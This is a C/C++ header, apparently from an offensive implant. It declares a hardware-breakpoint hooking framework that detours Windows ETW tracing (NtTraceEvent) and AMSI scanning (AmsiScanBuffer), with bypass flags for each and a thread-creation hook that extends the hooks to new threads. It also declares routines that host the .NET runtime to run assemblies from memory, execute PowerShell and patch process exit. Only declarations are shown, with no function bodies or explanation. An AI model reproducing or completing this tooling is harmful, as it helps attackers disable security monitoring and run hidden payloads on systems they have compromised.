#ifndef DOTNET_H
#define DOTNET_H

#include <clr.h>

#define PIPE_BUFFER_LENGTH 0x10000

namespace mscorlib {
    #include <mscoree.h>
}

typedef mscorlib::_PropertyInfo IPropertyInfo;
typedef mscorlib::_AppDomain    IAppDomain;
typedef mscorlib::_Assembly     IAssembly;
typedef mscorlib::_Type         IType;
typedef mscorlib::_MethodInfo   IMethodInfo;
typedef mscorlib::BindingFlags  IBindingFlags;

#define min(a, b) (((a) < (b)) ? (a) : (b))

namespace Write {
    enum Type {
        Default,
        Apc
    };
}

namespace Alloc {
    enum Type {
        Default,
        Drip
    };
}

#define HW_ALL_THREADS 0x25

enum Dr {
    x0,
    x1,
    x2,
    x3
};

typedef struct _DESCRIPTOR_HOOK {
    ULONG  ThreadID;
    HANDLE Handle;
    BOOL   Processed;
    INT8   Drx;
    UPTR   Address;
    VOID ( *Detour )( PCONTEXT );
    struct _DESCRIPTOR_HOOK* Next;
    struct _DESCRIPTOR_HOOK* Prev;
} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;

#define CONTINUE_EXEC( Ctx )( Ctx->EFlags = Ctx->EFlags | ( 1 << 16 ) )

#ifdef _WIN64
#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Rax = (UPTR)( Val ) ) )
#elif  _WIN32
#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Eax = (UPTR)( Val ) ) )
#endif

#define KH_BYPASS_NONE 0x000
#define KH_BYPASS_ALL  0x100
#define KH_BYPASS_ETW  0x400
#define KH_BYPASS_AMSI 0x700

namespace Hwbp {
    struct {
        UPTR NtTraceEvent;
    } Etw;

    struct {
        UPTR Handle;
        UPTR AmsiScanBuffer;
    } Amsi;

    UPTR ExitPtr;

    auto PatchExitDetour( PCONTEXT Ctx ) -> VOID;

    auto SetDr7(
        _In_ UPTR ActVal,
        _In_ UPTR NewVal,
        _In_ INT  StartPos,
        _In_ INT  BitsCount
    ) -> UPTR;

    auto Install(
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ PVOID Callback,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto Uninstall(
        _In_ UPTR  Address,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto SetBreak(
        _In_ ULONG ThreadID,
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ BOOL  Init
    ) -> BOOL;

    auto Insert(
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ BOOL  Init,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto Init( VOID ) -> BOOL;
    auto Clean( VOID ) -> BOOL;
    auto DotnetInit( VOID ) -> BOOL;
    auto DotnetExit( VOID ) -> BOOL;

    auto SetArg(
        _In_ PCONTEXT Ctx,
        _In_ UPTR     Val,
        _In_ ULONG    Idx
    ) -> VOID;

    auto GetArg(
        _In_ PCONTEXT Ctx,
        _In_ ULONG    Idx
    ) -> UPTR;

    auto MainHandler( 
        _In_ PEXCEPTION_POINTERS e 
    ) -> LONG;

    auto HookCallback(
        _In_ PVOID Parameter,
        _In_ BOOL  TimerWait
    ) -> VOID;

    auto EtwDetour(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    auto AmsiDetour(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    auto AddNewThreads(
        _In_ INT8 Drx
    ) -> BOOL;

    auto RmNewThreads(
        _In_ INT8 Drx
    ) -> BOOL;

    auto NtCreateThreadExHk(
        _In_ PCONTEXT Ctx
    ) -> VOID;
}

struct {
    GUID CLRMetaHost;
    GUID CorRuntimeHost;
} xCLSID = {
    .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
    .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
};

struct {
    GUID MscorlibAsm;
    GUID IHostControl;
    GUID AppDomain;
    GUID ICLRMetaHost;
    GUID ICLRRuntimeInfo;
    GUID ICorRuntimeHost;
    GUID IDispatch;
} xIID = {
    .MscorlibAsm      = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } },
    .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
    .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
    .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
    .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
    .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
    .IDispatch        = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } }
};

namespace Dotnet {
    BOOL  ExitBypass = FALSE;
    ULONG Bypass     = KH_BYPASS_NONE;
    UPTR  ExitPtr    = 0;

    auto VersionList( VOID ) -> VOID;

    auto Inline(
        _In_ BYTE*  AsmBytes,
        _In_ ULONG  AsmLength,
        _In_ WCHAR* Arguments,
        _In_ WCHAR* AppDomName,
        _In_ WCHAR* Version,
        _In_ BOOL   KeepLoad
    ) -> BOOL;

    auto CreateVariantCmd(
        WCHAR* Command
    ) -> VARIANT;

    auto CreateSafeArray(
        VARIANT* Args, 
        UINT     Argc
    ) -> SAFEARRAY*;    

    auto GetMethodType(
        IBindingFlags  Flags,
        IType*        MType,
        BSTR          MethodInp,
        IMethodInfo** MethodReff
    ) -> HRESULT;

    auto Pwsh(
        _In_     WCHAR* Command,
        _In_opt_ WCHAR*  Script
    ) -> HRESULT;

    auto GetAssemblyLoaded(
        _In_  IAppDomain* AppDomain,
        _In_  WCHAR*      AsmName1,
        _In_  GUID        AsmIID, 
        _Out_ IAssembly** Assembly
    ) -> HRESULT;

    auto PatchExit(
        _In_ ICorRuntimeHost* IRuntime
    ) -> PVOID;
}

#endif // DOTNET_H